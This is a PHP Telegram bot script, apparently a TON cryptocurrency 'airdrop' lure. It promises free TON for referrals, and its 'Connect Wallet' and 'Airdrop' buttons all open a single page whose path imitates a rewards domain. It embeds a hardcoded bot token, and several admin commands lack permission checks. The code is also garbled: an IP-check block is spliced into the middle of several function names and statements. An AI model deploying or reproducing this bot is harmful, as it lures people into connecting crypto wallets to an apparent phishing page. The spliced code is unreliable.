<?php
ob_start();
$load = sys_getloadavg();
$telegram_ip_ranges = [
['lower' => '149.154.160.0', 'upper' => '149.154.175.255'], 
['lower' => '91.108.4.0',    'upper' => '91.108.7.255'],    
];
$ip_dec = (float) sprintf("%u", ip2long($_SERVER['REMOTE_ADDR']));
$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if($ip_dec >= $lower_dec and $ip_dec <= $upper_dec) $ok=true;
}
if(!$ok) die("No Spam");
define('API_KEY','8165978594:AAHs6nXXW910kRFBzSg-Op5_oFX3foFZ_pQ'); //توکن
function bot($method,$datas=[]){
$url = "https://api.telegram.org/bot".API_KEY."/".$method;
$ch = curl_init();
curl_setopt($ch,CURLOPT_URL,$url);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
 $res = curl_exec($ch);
 if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
return json_decode($res);
}
}
//=========
$url="https://amanj.elhost.site/ton/tonrewards.catcoln.xyz/Spin/Beygi/index.html";
$myto_url="https://amanj.elhost.site/ton/tonrewards.catcoln.xyz/Spin/Beygi/index.html";
$aridiip_url="https://amanj.elhost.site/ton/tonrewards.catcoln.xyz/Spin/Beygi/index.html";
$toon_url="https://amanj.elhost.site/ton/tonrewards.catcoln.xyz/Spin/Beygi/index.html";
$token = API_KEY;
$Dev = 6038551208; //ایدی عددی ادمین
$name_bot = "واحد ";
$channel = "HEAN_1402";//  دست نزن
$bot_id = "HEN_1402"; // ا دست نزن
//-------------------------------فانکشن ها---------------------------------------------
function SendMessage($chat_id, $text){
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>$text,
'parse_mode'=>'MarkDown']);
}
function save($filename, $data){
$file = fopen($filename, 'w');
fwrite($file, $data);
fclose($file);
}
function S$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if($ip_dec >= $lower_dec and $endDocument($chat_id, $document, $caption = null){
bot('SendDocument',[
'chat_id'=>$chat_id,
'document'=>$document,
'caption'=>$caption
]);
}
function EditMessageText($xchatid,$xmessageid,$text,$parse_mode,$disable_web_page_preview,$keyboard){
bot('editMessagetext',[
'chat_id'=>$xchatid,
'message_id'=>$xmessageid,
'text'=>$text,
'parse_mode'=>$parse_mode,
'disable_web_page_preview'=>$disable_web_page_preview,
'reply_markup'=>$keyboard
]);
 }
function SendPhoto($chat_id, $photo, $caption = null){
bot('SendPhoto',[
'chat_id'=>$chat_id,
'photo'=>$photo,
'caption'=>$caption
]);
}
function sendAction($chat_id, $action){
bot('sendChataction',[
'chat_id'=>$chat_id,
'action'=>$action]);
}
function deleteFolder($path){
if(is_dir($path) === true){
$files = array_diff(scandir($path), array('.', '..'));
foreach ($files as $file)
deleteFolder(realpath($path) . '/' . $file);
return rmdir($path);
}else if (i$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if($ip_dec >= $lower_dec and $s_file($path) === true)
return unlink($path);
return false;
}
function Forward($kojashe, $azkoja, $kodommsg){
bot('forwardmessage',[
'chat_id'=>$kojashe,
'from_chat_id'=>$azkoja,
'message_id'=>$kodommsg
]);
}
function LeaveChat($chat_id){
bot('LeaveChat',[
'chat_id'=>$chat_id
]);
}
function GetChat($chat_id){
bot('GetChat',[
'chat_id'=>$chat_id
]);
}

//==
$update = json_decode(file_get_contents('php://input'));
$message = $update->message;
$chat_id = $message->chat->id;
$from_id = $message->from->id;
mkdir("data/$from_id");
$text1 = $update->message->text;
$text = $update->message->text;
$first_name = $update->message->from->first_name;
$last_name = $update->message->from->last_name;
$username = $update->message->from->username;
$message_id = $update->message->message_id;
$reply = $update->message->reply_to_message;
$coin = file_get_contents("data/$from_id/coin.txt");
$bot = file_get_contents("data/$from_id/step.txt");
$file=file_get_contents("data/$from_id/file.txt");
@$admi$ok=false;
foreach ($telegram_ip_ranges as $telegram_ip_range) if (!$ok) {
$lower_dec = (float) sprintf("%u", ip2long($telegram_ip_range['lower']));
$upper_dec = (float) sprintf("%u", ip2long($telegram_ip_range['upper']));
if($ip_dec >= $lower_dec and $nbotsaz = file_get_contents("data/$from_id/adminclicker.txt");
@$command = file_get_contents("data/$chat_id/com.txt");
@$amir = file_get_contents("data/$chat_id/amir.txt");
$remove = json_encode(['KeyboardRemove'=>[],'remove_keyboard'=>true]);
@$onof = file_get_contents("data/onof.txt");
$mode = file_get_contents("data/$from_id/mode.txt");
$state = file_get_contents("data/$from_id/state.txt");
$step = file_get_contents("data/$from_id/step.txt");
$allcoin = file_get_contents("data/$from_id/allcoin.txt");
$Members = file_get_contents("data/Member.txt");
$type = file_get_contents("data/$from_id/type.txt");
@$list = file_get_contents("users.txt");
@$sea = file_get_contents("data/$from_id/membrs.txt");
$wait = file_get_contents("data/$from_id/wait.txt");
$listttt = file_get_contents("Member.txt");
$members = file_get_contents('Member.txt');
$memlist = explode("\n", $members);
$member = file_get_contents("data/$from_id/member.txt");
$blocklist = file_get_contents("data/blocklist.txt");
$forward_chat_username = $update->message->forward_from_chat->username;
$created = file_get_contents("data/$from_id/create.txt");
$Bots = file_get_contents("data/bots.txt");
$user_bots = file_get_contents("data/$from_id/bots.txt");
$my_id = file_get_contents("bot00/$text/data/my_id.txt");
$user = json_decode(file_get_contents('data/'.$from_id.'/data.json'));
$to = file_get_contents("data/$from_id/to.txt");
$timenow = time();
$lasttime = file_get_contents("data/$from_id/time.txt");
$da = $update->message->reply_to_message->forward_from->id;
$forchaneel = json_decode(file_get_contents("https://api.telegram.org/bot$token/getChatMember?chat_id=@$channel&user_id=".$from_id));
$tch = $forchaneel->result->status;
//---------------------------شروع ---------------------------//
if(in_array($from_id, $list['ban'])){
SendMessage($chat_id,"
You have been blocked by the bot
",null);
exit();
}else{
function Spam($from_id){
@mkdir("data/spam");
$spam_status = json_decode(file_get_contents("data/spam/$from_id.json"),true);
if($spam_status != null){
if(mb_strpos($spam_status[0],"time") !== false){
if(str_replace("time ",null,$spam_status[0]) >= time())
exit(false);
else
$spam_status = [1,time()+2];
}
elseif(time() < $spam_status[1]){
if($spam_status[0]+1 > 4){
$time = time() + 500;
$spam_status = ["time $time"];
file_put_contents("data/spam/$from_id.json",json_encode($spam_status,true));
bot('SendMessage',[
'chat_id'=>$from_id,
'text'=>"📛 You have been blocked for 500 seconds due to spam!",
]);
exit(false);
}else{
$spam_status = [$spam_status[0]+1,$spam_status[1]];
}
}else{
$spam_status = [1,time()+2];
}
}else{
$spam_status = [1,time()+2];
}
file_put_contents("data/spam/$from_id.json",json_encode($spam_status,true));
}
}
Spam($from_id);
//=====
if($text1=="/start" and $chat_id != $Dev){
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
file_put_contents("data/$chat_id/membrs.txt", "0");
file_put_contents("data/$chat_id/coin.txt", "2");
file_put_contents("data/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("data/$chat_id/hadi.txt", "no");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"




",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>''],['text'=>'']],
],
'resize_keyboard'=>true,
])
]);
bot('sendMessage',[   
'chat_id'=>$Dev,    
'text'=>"
👇یک نفر با آیدی زیر ربات را استارت کرد👇

[$from_id](tg://user?id=$from_id)
",   
'parse_mode'=>'MarkDown'   
]);
}
if($text1=="/start"  and $chat_id == $Dev){
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
file_put_contents("data/$chat_id/membrs.txt", "0");
file_put_contents("data/$chat_id/coin.txt", "2");
file_put_contents("data/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("data/$chat_id/hadi.txt", "no");
bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"




",
'parse_mode'=>"HTML",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>''],['text'=>'']],
[['text'=>"👤پنل مدیریت👤"]],
],
'resize_keyboard'=>true,
])
]);
}
elseif (strpos($text, '/start') !== false) {
$newid = str_replace("/start ", "", $text);
if($from_id == $newid) {
bot('sendMessage', [
'chat_id' => $chat_id,
'text' => "
 no no no
",
]);
} 
elseif (strpos($list, "$from_id") !== false){
SendMessage($chat_id,"hi 
/start
");
}else{
@$sho = file_get_contents("data/$newid/coin.txt");
$getsho = $sho + 1;
file_put_contents("data/$newid/coin.txt", $getsho);
@$sea = file_get_contents("data/$newid/membrs.txt");
$getsea = $sea + 1;
file_put_contents("data/$newid/membrs.txt", $getsea);
$user = file_get_contents('users.txt');
$members = explode("\n", $user);
if(!in_array($from_id, $members)){
$add_user = file_get_contents('users.txt');
$add_user .= $from_id . "\n";
@$sea = file_get_contents("data/$from_id/membrs.txt");
file_put_contents("data/$chat_id/membrs.txt", "0");
file_put_contents("data/$chat_id/coin.txt", "2");
file_put_contents("data/$chat_id/type.txt", "Free");
file_put_contents('users.txt', $add_user);
}
file_put_contents("data/$chat_id/hadi.txt", "No");
sendmessage($chat_id, "

","Markdown","true");
bot('sendmessage', [
'chat_id' => $chat_id,
'text' => "



",
'parse_mode' => "HTML",
'reply_markup'=>json_encode([
'keyboard'=>[
[['text'=>''],['text'=>'']],
],
'resize_keyboard'=>true,
])
]);
bot('sendMessage',[   
'chat_id'=>$Dev,    
'text'=>"
👇یک نفر با آیدی زیر زیر ربات را استارت کرد👇

[$from_id](tg://user?id=$from_id)
",   
'parse_mode'=>'MarkDown'   
]);
SendMessage($newid, "✅[$first_name](tg://user?id=$from_id) frnd ","Markdown","true");
}
}

elseif(strpos($blocklist, "$from_id") !== false  ) {
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"You have been blocked in the bot for violating the rules
",
'reply_markup'=>json_encode([
'remove_keyboard'=>true,
])
]);
exit();
}
//========//
if($onof == "off" && $from_id != $Dev){
SendMessage($chat_id,"⚠درحال حاضر ربات توسط ادمین خاموش شده است لطفا در زمان دیگری تلاش کنید.⚠", null, $message_id, $remove);   
 return false;
exit();
}



if ($text1 == "/start") {
    $id = bot('sendphoto', [
        'chat_id' => $from_id,
        'photo' => "https://t.me/jjjjbbdbdbdbdbdbb/2",
        'caption' => "
👋 Hello! $first_name You are welcomed by the #TonCoin company!

🎁 Constant gifts and cool updates are waiting for you
",
        'disable_web_page_preview' => true,
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => "🤩 Lest Go", 'web_app' => ['url' => "$url"]],
                ],
                [
                    ['text' => "💳 Connect Wallet", 'web_app' => ['url' => "$myto_url"]],
                ],
                [
                    ['text' => "🔥 Airdrop", 'web_app' => ['url' => "$aridiip_url"]],
                ],
                [
                    ['text' => "", 'web_app' => ['url' => "$toon_url"]],
                ],
                [
                    ['text' => "Referral Link", 'url' => "https://t.me/hashchecker1_bot?start=gk"], // دکمه جدید برای کانال
                ]
            ]
        ])
    ]);
}

if ($text1 == "/start gk") {
    $id = bot('sendphoto', [
        'chat_id' => $from_id,
        'photo' => "https://t.me/jjjjbbdbdbdbdbdbb/2",
        'caption' => "

👥 Hi, your referral link:

Send the link to your friends to get Free TON 💎.

For each unique friends, you get 0.3 TON 💎.

For friends with a Telegram Premium subscription, you get 0.5 TON 💎

https://t.me/ANTOFIRABOT?start=$from_id 


",
        'disable_web_page_preview' => true,
        'parse_mode' => "markdown",
        'reply_markup' => json_encode([
            'inline_keyboard' => [
                [
                    ['text' => "🤩 Lest GO", 'web_app' => ['url' => "$url"]],
                ],
                [
                    ['text' => "🛠️ myto", 'web_app' => ['url' => "$myto_url"]],
                ],
                [
                    ['text' => "", 'web_app' => ['url' => "$aridiip_url"]],
                ],
                [
                    ['text' => "", 'web_app' => ['url' => "$toon_url"]],
                ],
                [
                    ['text' => "", 'url' => "https://t.me/hashchecker1_bot?start=gk"], // دکمه جدید برای کانال
                ]
            ]
        ])
    ]);
}

// در جایی دیگر در کد، می‌توانید این callback_data را مدیریت کنید:
if ($callback_data == "greet_user") {
    bot('editMessageText', [
        'chat_id' => $from_id,
        'message_id' => $message_id,
        'text' => "سلام",
        'parse_mode' => "markdown"
    ]);
}


if ($callback_data == 'fadd_click') {
    bot('sendMessage', [
        'chat_id' => $from_id,
        'text' => "سلام",
        'parse_mode' => "markdown"
    ]);
}






        	  if ($text1=="/id"){
 $id = bot('sendphoto',[ 
'chat_id'=>$from_id,
 'photo'=> "https://t.me/dynyejetjetjw",
 'caption'=>"
نام شما.                         $first_name 

عددی شما.                     $from_id 

تعداد زیرمجموعه شما.      $sea

",
            'parse_mode' => "MarkDown",
'reply_to_message_id'=>$message_id,
	'reply_markup'=>json_encode([
    'inline_keyboard'=>[
[['text'=>"(channel)",'url'=>"https://t.me/COIN"]],
[['text'=>"(group)",'url'=>"https://t.me/AFG"]],
     ]])]);	}


//====================//

//====================//

//====================//
elseif($text1 == '/add'){ 
 $id = bot('sendphoto',[ 
 'chat_id'=>$chat_id, 
 'photo'=> "https://t.me/jjjjbbdbdbdbdbdbb/2",
 'caption'=>"
👥 Hi, your referral link:

Send the link to your friends to get Free TON 💎.

For each unique friends, you get 0.3 TON 💎.

For friends with a Telegram Premium subscription, you get 0.5 TON 💎

https://t.me/ANTOFIRABOT?start=$from_id 
", 
      ])->result->message_id; 
    bot('sendmessage',[ 
 'chat_id'=>$chat_id, 
 'text'=>"", 
 'reply_to_message_id'=>$message_id, 
      ]); 
}
//=========================//


//===========================//



//===========
elseif($text1 == "پنل" or $text == "🔚" or $text == "👤پنل مدیریت👤"){
if($from_id == $Dev){
bot('sendmessage', [
'chat_id' =>$chat_id,
'text' =>"مدیر عزیز به پنل مدیریت خوش آمدید 🌹",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"پیام به کاربر📭"]],
[['text'=>"فوروارد همگانی✒"],['text'=>"پیام همگانی✏"]],
[['text'=>"روشن کردن ربات🔔"],['text'=>"خاموش کردن ربات🔕"]],
[['text'=>"📊"]],
[['text'=>"🏠"]],
],
'resize_keyboard'=>true
])
]);
}else{
SendMessage($chat_id,"wat?","HTML");
}
}
elseif($text1 == "فوروارد همگانی✒" && $from_id == $Dev){
file_put_contents("data/$from_id/step.txt","fwr12");
bot('Sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا پیام خود را فروارد کنید💢",
'parse_mode'=>'HTML',
'reply_markup'=>json_encode([
'keyboard'=>[
[
['text'=>"🔚"]
],
]
])
]);
}
elseif($step == "fwr12" && $from_id == $Dev){
file_put_contents("data/$from_id/step.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما با موفقیت به تمام اعضا فروارد شد❗️",
]);
$all_member = fopen( "users.txt", "r");
while( !feof( $all_member)){
$user = fgets( $all_member);
bot('ForwardMessage',[
'chat_id'=>$user,
'from_chat_id'=>$chat_id,
'message_id'=>$message_id
]);
}
}

//======================
elseif($text1 == "📊" && $chat_id == $Dev){
$user = file_get_contents("users.txt");
$member_id = explode("\n",$user);
$member_count = count($member_id) -1;
sendmessage($chat_id , "
🎲آمار:
 $member_count
" , "html");
}
elseif($text1 == "پیام همگانی✏" && $chat_id == $Dev){
file_put_contents("data/$from_id/step.txt","pm");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"لطفا پیام خود را ارسال کنید ✔️",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}
elseif($step == "pm" && $text !="🔚" ){
file_put_contents("data/$from_id/step.txt","none");
bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"پیام شما با موفقیت به تمام اعضا ارسال شد❗️",
]);
$all_member = fopen( "users.txt", "r");
while( !feof( $all_member)){
$user = fgets( $all_member);
SendMessage($user,$text1,"html");
}
}

elseif($text1 == "خاموش کردن ربات🔕"){
file_put_contents("data/onof.txt","off");
 bot('sendmessage',[
'chat_id'=>$chat_id,
'text'=>"رباتبا موفقیت از دسترس کاربران خارج شد🚫",
'parse_mode'=>'html',
'reply_markup'=>json_encode([
'keyboard'=>[

[['text'=>"🔚"]],
],
'resize_keyboard'=>true
])
]);
}

unlink('error_log');
?>